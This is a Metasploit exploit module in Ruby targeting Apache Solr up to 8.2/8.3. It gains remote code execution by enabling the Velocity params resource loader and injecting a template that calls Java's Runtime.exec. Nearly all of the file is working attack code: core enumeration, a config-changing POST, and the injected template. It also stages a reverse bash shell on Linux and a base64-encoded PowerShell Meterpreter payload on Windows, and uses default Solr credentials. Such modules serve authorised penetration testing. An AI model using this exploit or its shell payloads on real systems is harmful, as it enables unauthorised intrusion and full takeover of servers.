##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/powershell'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Apache Solr Remote Code Execution via Velocity Template',
        'Description'    => %q(
          This module exploits a vulnerability in Apache Solr <= 8.2.0 which allows remote code execution via a custom
          Velocity template. Currently, this module only supports Solr basic authentication.

          From the Tenable advisory:
          An attacker could target a vulnerable Apache Solr instance by first identifying a list
          of Solr core names. Once the core names have been identified, an attacker can send a specially crafted
          HTTP POST request to the Config API to toggle the params resource loader value for the Velocity Response
          Writer in the solrconfig.xml file to true. Enabling this parameter would allow an attacker to use the Velocity
          template parameter in a specially crafted Solr request, leading to RCE. This vulnerability currently does not
          have a CVE number assigned.

          Payload defaults to x86 Meterpreter reverse TCP for Windows and plain old reverse TCP shell for Linux.
        ),
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            's00py', # Discovery and PoC
            'jas502n', # exploit code on Github
            'AleWong', # ExploitDB contribution, and exploit code on Github
            'Imran E. Dawoodjee <imran[at]threathounds.com>' # Metasploit module
          ],
        'References'     =>
            [
              [ 'EDB', '47572' ],
              [ 'URL', 'https://www.tenable.com/blog/apache-solr-vulnerable-to-remote-code-execution-zero-day-vulnerability'],
              [ 'URL', 'https://www.huaweicloud.com/en-us/notice/2018/20191104170849387.html'],
              [ 'URL', 'https://gist.github.com/s00py/a1ba36a3689fa13759ff910e179fc133/'],
              [ 'URL', 'https://github.com/jas502n/solr_rce'],
              [ 'URL', 'https://github.com/AleWong/Apache-Solr-RCE-via-Velocity-template'],
            ],
        'Platform'       => ['unix', 'win'],
        'Targets'        =>
            [
              [
                'Unix-based',
                {
                  'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' },
                  'Arch'     => ARCH_CMD,
                  'Platform' => 'Unix'
                }
              ],
              [
                'x86/x64 Windows',
                {
                  'DefaultOptions' => { 'PAYLOAD' => 'windows/meterpreter/reverse_tcp' },
                  'Arch'     => [ARCH_X86, ARCH_X64],
                  'Platform' => 'Windows'
                }
              ]
            ],
        'DisclosureDate' => "Oct 29 2019",
        'DefaultTarget'  => 0,
        'Privileged'     => false
      )
    )

    register_options(
      [
        Opt::RPORT(8983),
        OptString.new('USERNAME', [false, 'Solr username', 'solr']),
        OptString.new('PASSWORD', [false, 'Solr password', 'SolrRocks']),
        OptString.new('TARGETURI', [false, 'Path to Solr', '/solr/'])
      ]
    )
  end

  # if we are going to exploit, we only need one core to be exploitable
  @vuln_core = ""
  # OS specific stuff
  @target_platform = ""
  @target_arch = ""
  # if authentication is used
  @auth_string = ""

  # check for vulnerability existence
  def check
    # see if authentication is required for the specified Solr instance
    auth_check = solr_get('uri' => normalize_uri(target_uri.path), 'auth' => @auth_string)

    # successfully connected?
    unless auth_check
      return CheckCode::Unknown("Connection failed!")
    end

    # if return code is not 200, then the Solr instance definitely requires authentication
    unless auth_check.code == 200
      print_warning("Authentication required for #{peer}!")
      vprint_warning("Server auth banner: #{auth_check['WWW-Authenticate']}")
      # if authentication is required and creds are not provided, we cannot reliably check exploitability
      if datastore['USERNAME'] == "" && datastore['PASSWORD'] == ""
        return CheckCode::Unknown("Credentials not provided, skipping credentialed check...")
      end

      # otherwise, try the given creds
      print_status("Attempting authentication for #{peer}...")
      attempt_auth = solr_get('uri' => normalize_uri(target_uri.path), 'auth' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']))

      # successfully connected?
      unless attempt_auth
        return CheckCode::Unknown("Connection failed!")
      end
      # if the return code is not 200, then authentication definitely failed
      unless attempt_auth.code == 200
        return CheckCode::Unknown("Authentication failed!")
      end

      print_good("Authentication succeeded!")
      @auth_string = basic_auth(datastore['USERNAME'], datastore['PASSWORD'])
      # TODO: add creds to MSF database
    end

    # send a GET request to get Solr and system details
    ver = solr_get('uri' => normalize_uri(target_uri.path, '/admin/info/system'), 'auth' => @auth_string)

    # can't connect? that's an automatic failure
    unless ver
      return CheckCode::Unknown("Connection failed!")
    end

    # convert to JSON
    ver_json = ver.get_json_document
    # get Solr version
    solr_version = Gem::Version.new(ver_json['lucene']['solr-spec-version'])
    print_status("Found Apache Solr #{solr_version}")
    # get OS version details
    @target_platform = ver_json['system']['name']
    @target_arch = ver_json['system']['arch']
    target_osver = ver_json['system']['version']
    print_status("OS version is #{@target_platform} #{@target_arch} #{target_osver}")
    # uname doesn't show up for Windows, so run a check for that
    if ver_json['system']['uname']
      # print uname only when verbose
      vprint_status("Full uname is '#{ver_json['system']['uname'].strip}'")
    end

    # the vulnerability is only present in Solr versions <= 8.3.0
    unless solr_version <= Gem::Version.new('8.3.0')
      return CheckCode::Safe("Running version of Solr is not vulnerable!")
    end

    # enumerate cores
    cores = solr_get('uri' => normalize_uri(target_uri.path, '/admin/cores'), 'auth' => @auth_string)

    # can't connect? that's yet another automatic failure
    unless cores
      return CheckCode::Unknown("Could not enumerate cores!")
    end

    # convert to JSON yet again
    cores_json = cores.get_json_document
    # draw up an array of all the cores
    cores_list = Array.new
    # get the core names
    cores_json['status'].keys.each do |core_name|
      cores_list.push(core_name)
    end

    # no cores? that means nothing to exploit.
    if cores_list.empty?
      return CheckCode::Safe("No cores found, nothing to exploit!")
    end

    # got cores? tell the operator which cores were found
    print_status("Found core(s): #{cores_list.join(', ')}")
    possibly_vulnerable_cores = {}

    cores_list.each do |core|
      # for each core, attempt to get config
      core_config = solr_get('uri' => normalize_uri(target_uri.path, core.to_s, 'config'), 'auth' => @auth_string)

      # can't retrieve configuration for that core? go next
      unless core_config
        print_error("Could not retrieve configuration for core #{core}!")
        next
      end

      # convert to JSON
      core_config_json = core_config.get_json_document
      # if the core configuration does not include the Velocity Response Writer, it isn't vulnerable
      if core_config_json['config']['queryResponseWriter'].keys.include?("velocity")
        vprint_good("Found Velocity Response Writer in use by core #{core}")
        if core_config_json['config']['queryResponseWriter']['velocity']['params.resource.loader.enabled'] == "true"
          vprint_good("params.resource.loader.enabled for core '#{core}' is set to true.")
          possibly_vulnerable_cores.store(core, true)
        else
          # if params.resource.loader.enabled is false, we need to set it to true before exploitation
          print_warning("params.resource.loader.enabled for core #{core} is set to false.")
          possibly_vulnerable_cores.store(core, false)
        end
      else
        vprint_error("Velocity Response Writer not found in core #{core}")
        next
      end
    end

    # look at the array of possibly vulnerable cores
    if possibly_vulnerable_cores.empty?
      return CheckCode::Safe "No cores are vulnerable!"
    else
      # if possible, pick a core that already has params.resource.loader.enabled set to true
      possibly_vulnerable_cores.each do |core|
        if core[1] == true
          @vuln_core = core
          break
        end
      end
      # otherwise, just pick the first one
      if @vuln_core.to_s == ""
        @vuln_core = possibly_vulnerable_cores.first
      end
      return CheckCode::Vulnerable
    end
  end

  # the exploit method
  def exploit
    unless [CheckCode::Vulnerable].include? check
      fail_with Failure::NotVulnerable, "Target is most likely not vulnerable!"
    end

    print_status("Targeting core '#{@vuln_core[0]}'")

    # the new config in JSON format
    enable_params_resource_loader = {
      "update-queryresponsewriter": {
        "startup": "lazy",
        "name": "velocity",
        "class": "solr.VelocityResponseWriter",
        "template.base.dir": "",
        "solr.resource.loader.enabled": "true",
        "params.resource.loader.enabled": "true"
      }
    }.to_json

    # if params.resource.loader.enabled for that core is not true
    if @vuln_core[1] != true
      print_status("params.resource.loader.enabled is not true, setting it to true...")
      update_config = send_request_cgi(
        'method'        => 'POST',
        'connection'    => 'Keep-Alive',
        'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
        'ctype'         => 'application/json;charset=utf-8',
        'encode_params' => false,
        'uri'           => normalize_uri(target_uri.path, @vuln_core[0].to_s, 'config'),
        'data'          => enable_params_resource_loader
      )

      unless update_config
        fail_with Failure::Unreachable, "Connection failed!"
      end

      # if we got anything other than a 200 back, the configuration update failed and the exploit won't work
      unless update_config.code == 200
        fail_with Failure::UnexpectedReply, "Unable to update config, exploit failed!"
      end

      print_good("params.resource.loader.enabled is now set to true!")
    end

    # windows...
    if @target_platform.include? "Windows"
      # if target is wrong, warn and exit before doing anything
      unless target.name.include? "Windows"
        fail_with Failure::NoTarget, "Target is found to be Windows, please select the proper target!"
      end

      # exploiting for Windows relies heavily on PowerShell, so go find it first
      # lazy check for PowerShell
      psh_enum = execute_command("where powershell", 'core_name' => @vuln_core[0])
      # did it connect?
      unless psh_enum
        fail_with Failure::Unreachable, "Connection failed!"
      end
      # no PowerShell found by automatic check?
      unless /powershell/i =~ psh_enum.body.to_s
        # manual check for PowerShell
        psh_enum_second = execute_command("cmd /c dir C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", 'core_name' => @vuln_core[0])
        # got a successful connection?
        unless psh_enum_second
          fail_with Failure::Unreachable, "Connection failed!"
        end
        # no PowerShell found by manual check?
        unless /powershell/i =~ psh_enum_second.body.to_s
          # abort the exploit if PowerShell was not found
          # TODO: CmdStager?
          fail_with Failure::NoTarget, "PowerShell not found, aborting exploit attempt!"
        end
      end

      print_good("PowerShell found, good to go!")
      # generate PowerShell command, encode with base64, and remove comspec
      psh_cmd = cmd_psh_payload(payload.encoded, payload_instance.arch.first, encode_final_payload: true, remove_comspec: true)
      # manually specify PowerShell path
      if psh_enum_second
        psh_cmd.insert(0, "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\")
      end

      # prepare to exploit...
      execute_command(psh_cmd, 'core_name' => @vuln_core[0])
    end

    # or unix-based?
    if @target_platform.include? "Linux"
      # if target is wrong, warn and exit before doing anything
      unless target.name.include? "Unix"
        fail_with Failure::NoTarget, "Target is found to be Unix-based, please select the proper target!"
      end

      # exploiting for Linux relies heavily on Bash, so go find it first
      # lazy check for Bash
      bash_enum = execute_command("which bash", 'core_name' => @vuln_core[0])
      # did it connect?
      unless bash_enum
        fail_with Failure::Unreachable, "Connection failed!"
      end
      # no Bash found by automatic check?
      unless /bash/i =~ bash_enum.body.to_s
        # manual check for Bash
        bash_enum_second = execute_command("ls /bin/bash", 'core_name' => @vuln_core[0])
        # got a successful connection?
        unless bash_enum_second
          fail_with Failure::Unreachable, "Connection failed!"
        end
        # no Bash found by manual check?
        unless /bash/i =~ bash_enum_second.body.to_s
          # abort the exploit if Bash was not found
          # TODO: CmdStager?
          fail_with Failure::NoTarget, "Bash not found, aborting exploit attempt!"
        end
      end

      # base64 payload has to be URI encoded
      b64_payload = Rex::Text.encode_base64(payload.encoded)
      # on Unix, works best with bash, got some serious beef with plain old sh (something to do with bad file descriptors)
      bash_cmd = "bash -c {echo,#{b64_payload}}|{base64,-d}|{bash,-i}"
      # prepare to exploit...
      execute_command(bash_cmd, 'core_name' => @vuln_core[0])
    end
  end

  # sic 'em, bois!
  def execute_command(cmd, opts = {})
    # custom template which enables command execution
    # template = <<-EOF
    #  #set($x="")
    #  #set($rt=$x.class.forName("java.lang.Runtime"))
    #  #set($chr=$x.class.forName("java.lang.Character"))
    #  #set($str=$x.class.forName("java.lang.String"))
    #  #set($ex=$rt.getRuntime().exec("#{cmd}"))
    #  $ex.waitFor() #set($out=$ex.getInputStream())
    #  #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
    # EOF
    template = '#set($x="") ' \
      '#set($rt=$x.class.forName("java.lang.Runtime")) ' \
      '#set($chr=$x.class.forName("java.lang.Character")) ' \
      '#set($str=$x.class.forName("java.lang.String")) ' \
      "#set($ex=$rt.getRuntime().exec('#{cmd}')) " \
      '$ex.waitFor() #set($out=$ex.getInputStream()) ' \
      '#foreach($i in [1..$out.available()])' \
        '$str.valueOf($chr.toChars($out.read()))' \
      '#end'

    # execute the exploit...
    solr_get(
      'uri' => normalize_uri(target_uri.path, opts['core_name'].to_s, 'select'),
      'auth' => @auth_string,
      'vars_get' =>  {
        'q'                 => '1',
        'wt'                => 'velocity',
        'v.template'        => 'custom',
        'v.template.custom' => template
      }
    )
  end

  # make sending requests easier
  def solr_get(opts = {})
    send_request_cgi_opts = {
      'method'        => 'GET',
      'connection'    => 'Keep-Alive',
      'uri'           => opts['uri']
    }

    # @auth_string defaults to "", meaning no authentication is necessary
    if opts['auth'] != ""
      send_request_cgi_opts.store('authorization', opts['auth'])
    end

    # a bit unrefined, but should suffice in this case
    if opts['vars_get']
      send_request_cgi_opts.store('vars_get', opts['vars_get'])
    end

    send_request_cgi(send_request_cgi_opts)
  end
end
